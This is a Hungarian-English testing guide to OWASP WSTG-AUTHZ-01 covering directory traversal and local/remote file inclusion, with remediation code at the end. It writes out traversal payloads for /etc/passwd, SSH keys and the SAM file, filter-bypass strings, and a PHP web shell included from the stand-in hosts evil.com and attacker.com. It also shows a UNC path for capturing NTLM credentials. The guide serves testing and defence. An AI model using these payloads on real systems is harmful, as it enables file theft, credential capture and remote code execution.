# WSTG-AUTHZ-01: Directory Traversal / File Include Tesztelése

## Mi a fejezet lényege?

Ez a fejezet arról szól, hogy a **directory traversal** (path traversal) és **file include** vulnerability-k lehetővé teszik **unauthorized file access**-t. **Weak input validation** + **../../../** sequence = **sensitive files** (passwd, config) **olvasása** vagy **remote code execution** (RFI).

⚠️ **NE KEVERD ÖSSZE:** Ez NEM általános input validation! Ez specifikusan **file path manipulation** - **directory traversal** (`../`) és **file inclusion** (local/remote).

---

## Mi a cél?

**Path traversal** és **file include** vulnerability-k:
- Identify file-related input vectors
- Test directory traversal (`../`)
- Test local file inclusion (LFI)
- Test remote file inclusion (RFI)
- Bypass filtering techniques

---

## Concept

### Directory Traversal:
```
Normal: /var/www/html/file.txt
Attack: /var/www/html/../../../../etc/passwd
Result: /etc/passwd (outside web root!)
```

### File Inclusion:
```
Local (LFI):  include($_GET['file']);
Remote (RFI): include($_GET['file']); → file=http://evil.com/shell.php
```

---

## Attack Types

### 1. **Local File Inclusion (LFI)**
### 2. **Remote File Inclusion (RFI)**
### 3. **Directory Traversal**
### 4. **Encoding Bypass**

---

## 1. Local File Inclusion (LFI)

### Concept:
**Read local files** outside web root via **path traversal**.

---

### Basic Attack:

**Vulnerable code:**
```php
<?php
$file = $_GET['file'];
include($file);
?>
```

**URL:**
```
https://example.com/index.php?file=../../../../etc/passwd
```

**Result:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

→ **CRITICAL!** Reads /etc/passwd!

---

### Common Targets (Linux):

```
/etc/passwd              - User accounts
/etc/shadow              - Password hashes (if readable)
/etc/hosts               - Host mappings
/etc/hostname            - Hostname
/etc/issue               - OS version
/var/log/apache2/access.log  - Web server logs
/var/log/apache2/error.log   - Error logs
/proc/self/environ       - Environment variables
/proc/self/cmdline       - Command line
~/.ssh/id_rsa            - SSH private key
~/.bash_history          - Command history
```

---

### Common Targets (Windows):

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\Windows\System32\config\SAM     - Password hashes
C:\inetpub\wwwroot\web.config      - IIS config
C:\xampp\apache\conf\httpd.conf    - Apache config
C:\Program Files\MySQL\my.ini      - MySQL config
```

---

### Testing:

```bash
# Linux - /etc/passwd
curl "https://example.com/page.php?file=../../../../etc/passwd"

# Windows - boot.ini
curl "https://example.com/page.php?file=../../../../boot.ini"

# Config files
curl "https://example.com/page.php?file=../../../config/database.php"
```

---

## 2. Remote File Inclusion (RFI)

### Concept:
**Include remote file** from attacker's server → **code execution**.

---

### Attack:

**Vulnerable code:**
```php
<?php
$file = $_GET['file'];
include($file);
?>
```

**Attacker creates shell.txt on evil.com:**
```php
<?php system($_GET['cmd']); ?>
```

**Attack URL:**
```
https://example.com/index.php?file=http://evil.com/shell.txt&cmd=whoami
```

**Result:** Executes `whoami` on victim server!

→ **CRITICAL!** Remote code execution!

---

### Testing:

```bash
# Test RFI
curl "https://example.com/page.php?file=http://attacker.com/test.txt"

# If successful, upload web shell
curl "https://example.com/page.php?file=http://attacker.com/shell.php&cmd=id"
```

---

## 3. Directory Traversal Patterns

### Basic Traversal:

```
../
../../
../../../
../../../../
../../../../../
```

---

### Example:

```
Normal URL:
https://example.com/download.php?file=report.pdf
(Reads: /var/www/html/files/report.pdf)

Attack:
https://example.com/download.php?file=../../../../etc/passwd
(Reads: /etc/passwd)
```

---

### Path Depth Testing:

```bash
# Try different depths
curl "https://example.com/file?path=../etc/passwd"
curl "https://example.com/file?path=../../etc/passwd"
curl "https://example.com/file?path=../../../etc/passwd"
curl "https://example.com/file?path=../../../../etc/passwd"
curl "https://example.com/file?path=../../../../../etc/passwd"
curl "https://example.com/file?path=../../../../../../etc/passwd"
```

**Keep adding `../` until successful!**

---

## 4. Encoding Bypass

### URL Encoding:

```
../      → %2e%2e%2f
../../   → %2e%2e%2f%2e%2e%2f
```

**Attack:**
```
https://example.com/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

---

### Double Encoding:

```
../      → %252e%252e%252f
```

**Attack:**
```
https://example.com/file?path=%252e%252e%252fetc%252fpasswd
```

---

### Unicode/UTF-8:

```
../ → ..%c0%af
../ → ..%c1%9c
```

---

### Mixed Encoding:

```
../ → %2e%2e/
../ → .%2e/
../ → ..%2f
```

---

## Windows-Specific Attacks

### Backslash Separator:

```
# Windows uses \ not /
..\
..\..\
..\..\..\
```

**Example:**
```
https://example.com/file?path=..\..\..\Windows\win.ini
```

---

### Forward Slash Also Works:

```
# Windows accepts both!
../
../../
```

---

### Null Byte Injection (PHP < 5.3.4):

**Concept:** Null byte (`%00`) **terminates string**.

**Vulnerable code:**
```php
include($_GET['file'] . ".php");
```

**Attack:**
```
https://example.com/page.php?file=../../../../etc/passwd%00

Result: include("../../../../etc/passwd\0.php")
→ PHP truncates at \0
→ Reads /etc/passwd (ignores .php extension)
```

---

### Trailing Characters:

**Windows ignores:**
- Spaces: `file.txt    `
- Dots: `file.txt...`
- Angle brackets: `file.txt<>>`

**Attack:**
```
https://example.com/file?path=boot.ini........
https://example.com/file?path=boot.ini<spaces>
```

---

### UNC Paths (SMB):

```
\\server\share\file.txt
```

**Attack:**
```
https://example.com/file?path=\\attacker.com\share\shell.php

Result:
- Server connects to attacker's SMB
- Sends NTLM credentials (can crack!)
- Includes attacker's file
```

---

## Filter Bypass Techniques

### Bypass #1: **Strip ../ Filter**

**Filter:**
```php
$file = str_replace("../", "", $_GET['file']);
```

**Bypass:**
```
....//
..././
....\/
```

**Explanation:**
```
....// → after removing ../ → ../
```

---

### Bypass #2: **Absolute Path**

**If relative paths filtered:**
```
/etc/passwd
C:\Windows\win.ini
```

---

### Bypass #3: **Case Sensitivity**

```
../
.../
..../
..\
```

---

### Bypass #4: **Recursive Removal**

**Filter:**
```php
while(strpos($file, "../") !== false) {
    $file = str_replace("../", "", $file);
}
```

**Bypass:**
```
....//....//....//etc/passwd
```

---

## Testing Checklist

### Input Vector Enumeration:
```
☐ URL parameters (file=, page=, path=, etc.)
☐ POST parameters
☐ Cookies (TEMPLATE=, PSTYLE=)
☐ HTTP headers (User-Agent?, Referer?)
☐ File upload filenames
☐ Any user-controlled path/file input
```

---

### Basic Testing:
```
☐ Test ../../../etc/passwd (Linux)
☐ Test ..\..\..\Windows\win.ini (Windows)
☐ Test different depths (1-10 levels)
☐ Test absolute paths (/etc/passwd)
☐ Test null byte (%00)
☐ Test RFI (http://attacker.com/shell.txt)
```

---

### Encoding Testing:
```
☐ URL encoding (%2e%2e%2f)
☐ Double encoding (%252e)
☐ Unicode encoding
☐ Mixed encoding
```

---

### Bypass Testing:
```
☐ Double traversal (..../)
☐ Mixed separators (..\..)
☐ Trailing dots/spaces (Windows)
☐ UNC paths (\\server\)
☐ Case variations
```

---

## Gyakorlati Cheat Sheet

| Attack | Payload |
|--------|---------|
| Basic LFI | `../../../../etc/passwd` |
| Windows | `..\..\..\Windows\win.ini` |
| Null byte | `../../../../etc/passwd%00` |
| URL encoded | `%2e%2e%2f%2e%2e%2fetc/passwd` |
| Double encoded | `%252e%252e%252fetc%252fpasswd` |
| Filter bypass | `....//....//etc/passwd` |
| RFI | `http://attacker.com/shell.txt` |
| UNC path | `\\attacker.com\share\shell.php` |

---

## Fontos Toolok

### Manual:
- **curl** - Testing
- **Burp Suite** - Intercept & modify

### Automated:
- **DotDotPwn** - Directory traversal fuzzer
- **wfuzz** - Fuzzing with wordlists
- **ZAP** - Automated scanning

### Wordlists:
- **PayloadsAllTheThings** - Comprehensive payloads
- **SecLists** - Traversal wordlists

---

## Védelem (Remediation)

### 1. **Whitelist Allowed Files:**

```php
// BAD
$file = $_GET['file'];
include($file);

// GOOD
$allowed = ['home.php', 'about.php', 'contact.php'];
$file = $_GET['file'];

if (in_array($file, $allowed)) {
    include($file);
} else {
    die("Invalid file");
}
```

---

### 2. **Basename Only (No Paths):**

```php
$file = basename($_GET['file']);
include("/var/www/html/pages/" . $file);

// basename("../../../../etc/passwd") → "passwd"
// Result: /var/www/html/pages/passwd (safe!)
```

---

### 3. **Realpath Validation:**

```php
$base_dir = "/var/www/html/files/";
$file = realpath($base_dir . $_GET['file']);

// Verify file is within base directory
if (strpos($file, $base_dir) !== 0) {
    die("Access denied");
}

include($file);
```

---

### 4. **Disable Remote Includes (PHP):**

```ini
# php.ini
allow_url_include = Off
allow_url_fopen = Off
```

---

### 5. **Input Sanitization:**

```php
function sanitize_path($path) {
    // Remove null bytes
    $path = str_replace(chr(0), '', $path);
    
    // Remove ../ and ..\
    $path = str_replace(['../', '..\\'], '', $path);
    
    // Remove absolute path attempts
    $path = str_replace(['/', '\\'], '', $path);
    
    return $path;
}
```

**Note:** Blacklist filtering is weak! Use whitelist!

---

## Fontos Megjegyzések

✅ **Whitelist** allowed files (best!)  
✅ **basename()** strips path  
✅ **realpath()** validation  
✅ **Disable** allow_url_include  
❌ **Never trust** user input for file paths!  
❌ **Blacklist filtering** easily bypassed!  
⚠️ **../../../../** works on most systems!  
⚠️ **Null byte** (%00) on old PHP!  
⚠️ **UNC paths** = SMB credential theft!  
⚠️ **RFI** = remote code execution!

---

**Összefoglalva:** Ez a fejezet a **directory traversal** és **file inclusion** teszteléséről szól. **LFI** (Local File Inclusion) = **../../../../etc/passwd** read sensitive files. **RFI** (Remote File Inclusion) = **http://evil.com/shell.php** remote code execution. **Windows**: backslash (`\`), **null byte** (`%00`), **trailing dots/spaces**, **UNC paths** (`\\server\share`). **Bypass techniques**: **..../** (double traversal), **URL encoding** (%2e%2e%2f), **double encoding**, **Unicode**. **Defense**: **whitelist** allowed files (BEST), **basename()** strip paths, **realpath()** validation, **disable allow_url_include**! **NEVER** trust user input for file paths!
